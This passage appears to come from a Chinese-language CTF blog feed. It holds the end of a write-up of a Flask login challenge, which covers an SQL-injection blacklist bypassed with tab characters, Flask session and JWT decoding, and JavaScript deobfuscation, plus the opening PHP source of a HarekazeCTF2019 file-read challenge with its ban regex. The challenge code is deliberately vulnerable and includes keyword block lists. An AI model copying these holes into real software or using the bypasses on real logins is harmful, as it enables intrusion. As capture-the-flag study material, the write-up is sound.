        <span class="token keyword">else</span><span class="token punctuation">:</span>
            error <span class="token operator">=</span> <span class="token string">"Invalid login credentials. Please try again."</span>
            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"login.html"</span><span class="token punctuation">,</span> error<span class="token operator">=</span>error<span class="token punctuation">)</span>

    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"login.html"</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">"logged_in"</span> <span class="token keyword">in</span> session <span class="token keyword">and</span> session<span class="token punctuation">[</span><span class="token string">"logged_in"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        session<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">"logged_in"</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"index"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"landing.html"</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/profile"</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">profile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">"logged_in"</span> <span class="token keyword">in</span> session <span class="token keyword">and</span> session<span class="token punctuation">[</span><span class="token string">"logged_in"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        username <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span>
        secret <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"secret"</span><span class="token punctuation">)</span>
        key <span class="token operator">=</span> <span class="token string">"0"</span>
        <span class="token keyword">if</span> <span class="token string">"secret"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span><span class="token punctuation">:</span>
            key <span class="token operator">=</span> <span class="token string">"1"</span>
        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span>
            <span class="token string">"profile.html"</span><span class="token punctuation">,</span> username<span class="token operator">=</span>username<span class="token punctuation">,</span> secret<span class="token operator">=</span>secret<span class="token punctuation">,</span> key<span class="token operator">=</span>key
        <span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        error <span class="token operator">=</span> <span class="token string">"You are not logged in. Please log in first."</span>
        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"login.html"</span><span class="token punctuation">,</span> error<span class="token operator">=</span>error<span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/logout"</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    session<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">"logged_in"</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"login.html"</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>after_request</span>
<span class="token keyword">def</span> <span class="token function">add_cache_control</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">:</span>
    response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">"Cache-Control"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"no-store, no-cache, must-revalidate, max-age=0"</span>
    response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">"Pragma"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"no-cache"</span>
    response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">"Expires"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"-1"</span>
    <span class="token keyword">return</span> response


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">1337</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>通过对代码进行审计可以看到再login路由下存在SQL注入，也就是登录处，但是对字符进行了白名单限制</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">,</span> <span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">"logged_in"</span> <span class="token keyword">in</span> session <span class="token keyword">and</span> session<span class="token punctuation">[</span><span class="token string">"logged_in"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        session<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">"logged_in"</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"login"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>
        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span>
        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span>
        loweruser <span class="token operator">=</span> username<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
        lowerpass <span class="token operator">=</span> password<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
        invalid_entries <span class="token operator">=</span> invalid_entries <span class="token operator">=</span> <span class="token punctuation">[</span>
            <span class="token string">"="</span><span class="token punctuation">,</span> <span class="token string">"&lt;"</span><span class="token punctuation">,</span> <span class="token string">">"</span><span class="token punctuation">,</span> <span class="token string">"+"</span><span class="token punctuation">,</span> <span class="token string">"//"</span><span class="token punctuation">,</span> <span class="token string">"|"</span><span class="token punctuation">,</span> <span class="token string">";"</span><span class="token punctuation">,</span> <span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"'1"</span><span class="token punctuation">,</span> <span class="token string">" 1"</span><span class="token punctuation">,</span> <span class="token string">" true"</span><span class="token punctuation">,</span> <span class="token string">"'true"</span><span class="token punctuation">,</span> <span class="token string">" or"</span><span class="token punctuation">,</span> <span class="token string">"'or"</span><span class="token punctuation">,</span> <span class="token string">"/or"</span><span class="token punctuation">,</span> <span class="token string">" and"</span><span class="token punctuation">,</span> <span class="token string">"'and"</span><span class="token punctuation">,</span> <span class="token string">"/and"</span><span class="token punctuation">,</span> <span class="token string">"'like"</span><span class="token punctuation">,</span> <span class="token string">" like"</span><span class="token punctuation">,</span> <span class="token string">"/like"</span><span class="token punctuation">,</span> <span class="token string">"'where"</span><span class="token punctuation">,</span> <span class="token string">" where"</span><span class="token punctuation">,</span> <span class="token string">"/where"</span><span class="token punctuation">,</span> <span class="token string">"%00"</span><span class="token punctuation">,</span> <span class="token string">"null"</span><span class="token punctuation">,</span> <span class="token string">"admin'"</span><span class="token punctuation">,</span>
        <span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>尝试使用tab键来绕过空格（space）<br><img src="https://img-blog.csdnimg.cn/direct/93bfeaf0295c43d48ef70cbd87a486ad.png" alt="123"><br>发现能够成功登录<br><img src="https://img-blog.csdnimg.cn/direct/52755f94cb094aa9a92e157b803d8a97.png" alt="123"><br>也没有发现什么，结合源码还给了一个SQL文件</p>
<p><strong>schema_sql</strong></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> login_details <span class="token punctuation">(</span>
    id <span class="token keyword">INTEGER</span> <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> AUTOINCREMENT<span class="token punctuation">,</span>
    username <span class="token keyword">TEXT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>
    password <span class="token keyword">TEXT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span>
<span class="token punctuation">,</span> secret <span class="token keyword">TEXT</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>尝试查看一下secret字段<br><img src="https://img-blog.csdnimg.cn/direct/b91ec43d9b3841cb9fa9d01fdbca11e5.png" alt="465"><br>这时候发现session内容变多了，结合前面登陆成功所给的secret，不免会想到session相关题目，将此处的session进行解码使用<code>flask-unsign</code><br><img src="https://img-blog.csdnimg.cn/direct/bb4db8d78a7941d9a60ca39d80f62c98.png" alt="456"><br>将得到的密文进行JWT解码<br><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmbGFnIjoibml0ZXtpc190aGlzX3RoZV9mbGFnP30iLCJuYW1lIjoiVHJ5IGFuZCBnZXQgdGhlIGZsYWchIiwiZGVzYyI6IihmdW5jdGlvbihfMHhkOGZiZGIsXzB4MjQyNDgzKXt2YXIgXzB4NTVkYzdjPV8weDNlN2QsXzB4M2FlZmExPV8weGQ4ZmJkYigpO3doaWxlKCEhW10pe3RyeXt2YXIgXzB4M2Q3ODQ3PS1wYXJzZUludChfMHg1NWRjN2MoMHg5MikpLzB4MSoocGFyc2VJbnQoXzB4NTVkYzdjKDB4OTYpKS8weDIpK3BhcnNlSW50KF8weDU1ZGM3YygweDhlKSkvMHgzKigtcGFyc2VJbnQoXzB4NTVkYzdjKDB4OTMpKS8weDQpK3BhcnNlSW50KF8weDU1ZGM3YygweDk0KSkvMHg1K3BhcnNlSW50KF8weDU1ZGM3YygweDhmKSkvMHg2KigtcGFyc2VJbnQoXzB4NTVkYzdjKDB4OGIpKS8weDcpK3BhcnNlSW50KF8weDU1ZGM3YygweDkxKSkvMHg4Ky1wYXJzZUludChfMHg1NWRjN2MoMHg4YykpLzB4OSoocGFyc2VJbnQoXzB4NTVkYzdjKDB4OTUpKS8weGEpK3BhcnNlSW50KF8weDU1ZGM3YygweDkwKSkvMHhiO2lmKF8weDNkNzg0Nz09PV8weDI0MjQ4MylicmVhaztlbHNlIF8weDNhZWZhMVsncHVzaCddKF8weDNhZWZhMVsnc2hpZnQnXSgpKTt9Y2F0Y2goXzB4NGIyODljKXtfMHgzYWVmYTFbJ3B1c2gnXShfMHgzYWVmYTFbJ3NoaWZ0J10oKSk7fX19KF8weDQ0ZTcsMHhiNGJmMSkpO2Z1bmN0aW9uIF8weDNlN2QoXzB4M2JjYTMzLF8weDIxZjY0OCl7dmFyIF8weDQ0ZTc3Yz1fMHg0NGU3KCk7cmV0dXJuIF8weDNlN2Q9ZnVuY3Rpb24oXzB4M2U3ZGU2LF8weDMxZmViYyl7XzB4M2U3ZGU2PV8weDNlN2RlNi0weDhiO3ZhciBfMHg1ZTU4NTA9XzB4NDRlNzdjW18weDNlN2RlNl07cmV0dXJuIF8weDVlNTg1MDt9LF8weDNlN2QoXzB4M2JjYTMzLF8weDIxZjY0OCk7fWZ1bmN0aW9uIHd1dF9pc190aGlzX25vdygpe3ZhciBfMHg1OTQ5NTY9XzB4M2U3ZDtjb25zb2xlWydsb2cnXShfMHg1OTQ5NTYoMHg4ZCkpO31mdW5jdGlvbiBfMHg0NGU3KCl7dmFyIF8weDQ1ZDA4ZT1bJzlsbENnTm8nLCdhSFIwY0hNNkx5OW5hWFJvZFdJdVkyOXRMMmx6YUdGdUxYTjFjbUZ1WVM5amFHRnNiR1Z1WjJVdicsJzkyNG9mb3BKQicsJzE1NzA5OHR0REd2YScsJzI0MjU3Mjc3YW1kc2RZJywnNDY1NzY4MFdhaWNKRCcsJzh4SHRxc2QnLCcxNjI1Mld6cWZjcycsJzExOTg3OTVlVUFmSUQnLCc0MDI1MTEwR1hveWJNJywnNzk2ODJRU254c1MnLCc4NHhCSnNzdyddO18weDQ0ZTc9ZnVuY3Rpb24oKXtyZXR1cm4gXzB4NDVkMDhlO307cmV0dXJuIF8weDQ0ZTcoKTt9IiwiaWF0IjoxNTE2MjM5MDIyfQ.bTHY_Rrkc2mn2xwJe1tP_PeGUftqNoWZFLO2yBH2B5Q</code></p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
  <span class="token property">"header"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token property">"alg"</span><span class="token operator">:</span> <span class="token string">"HS256"</span><span class="token punctuation">,</span>
    <span class="token property">"typ"</span><span class="token operator">:</span> <span class="token string">"JWT"</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token property">"payload"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token property">"flag"</span><span class="token operator">:</span> <span class="token string">"nite&#123;is_this_the_flag?&#125;"</span><span class="token punctuation">,</span>
    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"Try and get the flag!"</span><span class="token punctuation">,</span>
    <span class="token property">"desc"</span><span class="token operator">:</span> <span class="token string">"(function(_0xd8fbdb,_0x242483)&#123;var _0x55dc7c=_0x3e7d,_0x3aefa1=_0xd8fbdb();while(!![])&#123;try&#123;var _0x3d7847=-parseInt(_0x55dc7c(0x92))/0x1*(parseInt(_0x55dc7c(0x96))/0x2)+parseInt(_0x55dc7c(0x8e))/0x3*(-parseInt(_0x55dc7c(0x93))/0x4)+parseInt(_0x55dc7c(0x94))/0x5+parseInt(_0x55dc7c(0x8f))/0x6*(-parseInt(_0x55dc7c(0x8b))/0x7)+parseInt(_0x55dc7c(0x91))/0x8+-parseInt(_0x55dc7c(0x8c))/0x9*(parseInt(_0x55dc7c(0x95))/0xa)+parseInt(_0x55dc7c(0x90))/0xb;if(_0x3d7847===_0x242483)break;else _0x3aefa1['push'](_0x3aefa1['shift']());&#125;catch(_0x4b289c)&#123;_0x3aefa1['push'](_0x3aefa1['shift']());&#125;&#125;&#125;(_0x44e7,0xb4bf1));function _0x3e7d(_0x3bca33,_0x21f648)&#123;var _0x44e77c=_0x44e7();return _0x3e7d=function(_0x3e7de6,_0x31febc)&#123;_0x3e7de6=_0x3e7de6-0x8b;var _0x5e5850=_0x44e77c[_0x3e7de6];return _0x5e5850;&#125;,_0x3e7d(_0x3bca33,_0x21f648);&#125;function wut_is_this_now()&#123;var _0x594956=_0x3e7d;console['log'](_0x594956(0x8d));&#125;function _0x44e7()&#123;var _0x45d08e=['9llCgNo','aHR0cHM6Ly9naXRodWIuY29tL2lzaGFuLXN1cmFuYS9jaGFsbGVuZ2Uv','924ofopJB','157098ttDGva','24257277amdsdY','4657680WaicJD','8xHtqsd','16252Wzqfcs','1198795eUAfID','4025110GXoybM','79682QSnxsS','84xBJssw'];_0x44e7=function()&#123;return _0x45d08e;&#125;;return _0x44e7();&#125;"</span><span class="token punctuation">,</span>
    <span class="token property">"iat"</span><span class="token operator">:</span> <span class="token number">1516239022</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可看出<code>desc</code>处对代码进行了混淆，尝试反混淆</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json">(function(topic<span class="token punctuation">,</span> b) <span class="token punctuation">&#123;</span>
  <span class="token comment">/** @type &#123;function (number, ?): ?&#125; */</span>
  var getter = _0x3e7d;
  var out = topic();
  for (;!!<span class="token punctuation">[</span><span class="token punctuation">]</span>;) <span class="token punctuation">&#123;</span>
    try <span class="token punctuation">&#123;</span>
      <span class="token comment">/** @type &#123;number&#125; */</span>
      var a = -parseInt(getter(<span class="token number">146</span>)) / <span class="token number">1</span> * (parseInt(getter(<span class="token number">150</span>)) / <span class="token number">2</span>) + parseInt(getter(<span class="token number">142</span>)) / <span class="token number">3</span> * (-parseInt(getter(<span class="token number">147</span>)) / <span class="token number">4</span>) + parseInt(getter(<span class="token number">148</span>)) / <span class="token number">5</span> + parseInt(getter(<span class="token number">143</span>)) / <span class="token number">6</span> * (-parseInt(getter(<span class="token number">139</span>)) / <span class="token number">7</span>) + parseInt(getter(<span class="token number">145</span>)) / <span class="token number">8</span> + -parseInt(getter(<span class="token number">140</span>)) / <span class="token number">9</span> * (parseInt(getter(<span class="token number">149</span>)) / <span class="token number">10</span>) + parseInt(getter(<span class="token number">144</span>)) / <span class="token number">11</span>;
      if (a === b) <span class="token punctuation">&#123;</span>
        break;
      <span class="token punctuation">&#125;</span> else <span class="token punctuation">&#123;</span>
        out<span class="token punctuation">[</span><span class="token string">"push"</span><span class="token punctuation">]</span>(out<span class="token punctuation">[</span><span class="token string">"shift"</span><span class="token punctuation">]</span>());
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> catch (_0x4b289c) <span class="token punctuation">&#123;</span>
      out<span class="token punctuation">[</span><span class="token string">"push"</span><span class="token punctuation">]</span>(out<span class="token punctuation">[</span><span class="token string">"shift"</span><span class="token punctuation">]</span>());
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>)(_0x44e7<span class="token punctuation">,</span> <span class="token number">740337</span>);
<span class="token comment">/**
 * @param &#123;number&#125; opt_attributes
 * @param &#123;?&#125; deepDataAndEvents
 * @return &#123;?&#125;
 */</span>
function _0x3e7d(opt_attributes<span class="token punctuation">,</span> deepDataAndEvents) <span class="token punctuation">&#123;</span>
  var args = _0x44e7();
  return _0x3e7d = function(opt_attributes<span class="token punctuation">,</span> deepDataAndEvents) <span class="token punctuation">&#123;</span>
    <span class="token comment">/** @type &#123;number&#125; */</span>
    opt_attributes = opt_attributes - <span class="token number">139</span>;
    var pageY = args<span class="token punctuation">[</span>opt_attributes<span class="token punctuation">]</span>;
    return pageY;
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> _0x3e7d(opt_attributes<span class="token punctuation">,</span> deepDataAndEvents);
<span class="token punctuation">&#125;</span>
<span class="token comment">/**
 * @return &#123;undefined&#125;
 */</span>
function wut_is_this_now() <span class="token punctuation">&#123;</span>
  <span class="token comment">/** @type &#123;function (number, ?): ?&#125; */</span>
  var prepArgs = _0x3e7d;
  console<span class="token punctuation">[</span><span class="token string">"log"</span><span class="token punctuation">]</span>(prepArgs(<span class="token number">141</span>));
<span class="token punctuation">&#125;</span>
<span class="token comment">/**
 * @return &#123;?&#125;
 */</span>
function _0x44e7() <span class="token punctuation">&#123;</span>
  <span class="token comment">/** @type &#123;Array&#125; */</span>
  var aHR0cHM6Ly9naXRodWIuY29tL2lzaGFuLXN1cmFuYS9jaGFsbGVuZ2Uv = <span class="token punctuation">[</span><span class="token string">"9llCgNo"</span><span class="token punctuation">,</span> <span class="token string">"aHR0cHM6Ly9naXRodWIuY29tL2lzaGFuLXN1cmFuYS9jaGFsbGVuZ2Uv"</span><span class="token punctuation">,</span> <span class="token string">"924ofopJB"</span><span class="token punctuation">,</span> <span class="token string">"157098ttDGva"</span><span class="token punctuation">,</span> <span class="token string">"24257277amdsdY"</span><span class="token punctuation">,</span> <span class="token string">"4657680WaicJD"</span><span class="token punctuation">,</span> <span class="token string">"8xHtqsd"</span><span class="token punctuation">,</span> <span class="token string">"16252Wzqfcs"</span><span class="token punctuation">,</span> <span class="token string">"1198795eUAfID"</span><span class="token punctuation">,</span> <span class="token string">"4025110GXoybM"</span><span class="token punctuation">,</span> <span class="token string">"79682QSnxsS"</span><span class="token punctuation">,</span> <span class="token string">"84xBJssw"</span><span class="token punctuation">]</span>;
  <span class="token comment">/**
   * @return &#123;?&#125;
   */</span>
  _0x44e7 = function() <span class="token punctuation">&#123;</span>
    return aHR0cHM6Ly9naXRodWIuY29tL2lzaGFuLXN1cmFuYS9jaGFsbGVuZ2Uv;<span class="token comment">//base64解码为https://github.com/ishan-surana/challenge/</span>
  <span class="token punctuation">&#125;</span>;
  return _0x44e7();
<span class="token punctuation">&#125;</span>
;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>flag就在里面，但是由于比赛结束，flag已经删除。。。</p>
<h2 id="js混淆与反混淆"><a href="#js混淆与反混淆" class="headerlink" title="js混淆与反混淆"></a>js混淆与反混淆</h2><h3 id="JS混淆"><a href="#JS混淆" class="headerlink" title="JS混淆"></a><strong>JS混淆</strong></h3><p>JavaScript混淆是一种通过修改源代码，使其难以阅读和理解的技术。这种技术的目的是增加代码的复杂性，从而防止逆向工程、减缓恶意攻击和防止未经授权的复制。混淆通常包括以下几个方面：</p>
<ol>
<li><strong>变量和函数名重命名：</strong> 将代码中的变量名和函数名替换为无意义、短小或难以理解的名称。</li>
<li><strong>控制流混淆：</strong> 修改代码的控制流程，使其变得复杂和难以分析。这可能包括添加无用的分支、条件语句重组等。</li>
<li><strong>字符串和常量加密：</strong> 将字符串和常量进行加密或编码，使其在运行时动态解码，增加代码分析的难度。</li>
<li><strong>添加噪音和无用代码：</strong> 在代码中添加无用的语句、注释或函数，使其更加混乱，增加理解的难度。</li>
</ol>
<h3 id="JavaScript反混淆"><a href="#JavaScript反混淆" class="headerlink" title="JavaScript反混淆"></a>JavaScript反混淆</h3><p>JavaScript反混淆是一种尝试还原混淆代码的过程，以便更容易地理解和分析代码。反混淆的目标是还原代码的可读性，以便于审查、维护或逆向工程。反混淆通常包括以下一些方法：</p>
<ol>
<li><strong>还原变量和函数名：</strong> 将混淆过的变量名和函数名还原为更有意义的名称，以提高代码的可读性。</li>
<li><strong>简化控制流：</strong> 通过移除无用的分支或还原原始的控制流程，使代码更易于理解。</li>
<li><strong>解密字符串和常量：</strong> 解密加密的字符串和常量，还原它们的原始值。</li>
<li><strong>去除噪音和无用代码：</strong> 删除添加的无用语句、注释或函数，以简化代码。</li>
</ol>
]]></content>
      <categories>
        <category>赛事WP</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-WEB之[HarekazeCTF2019]encode_and_encode</title>
    <url>/2023/12/13/BUUCTF-WEB%E4%B9%8B-HarekazeCTF2019-encode-and-encode/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function-definition function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token variable">$banword</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token comment">// no path traversal</span>
    <span class="token string single-quoted-string">'\.\.'</span><span class="token punctuation">,</span>
    <span class="token comment">// no stream wrapper</span>
    <span class="token string single-quoted-string">'(php|file|glob|data|tp|zip|zlib|phar):'</span><span class="token punctuation">,</span>
    <span class="token comment">// no data exfiltration</span>
    <span class="token string single-quoted-string">'flag'</span>
  <span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token variable">$regexp</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$banword</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/i'</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$regexp</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$body</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$json</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$body</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$body</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$json</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$content</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;p>not found&lt;/p>\n"</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
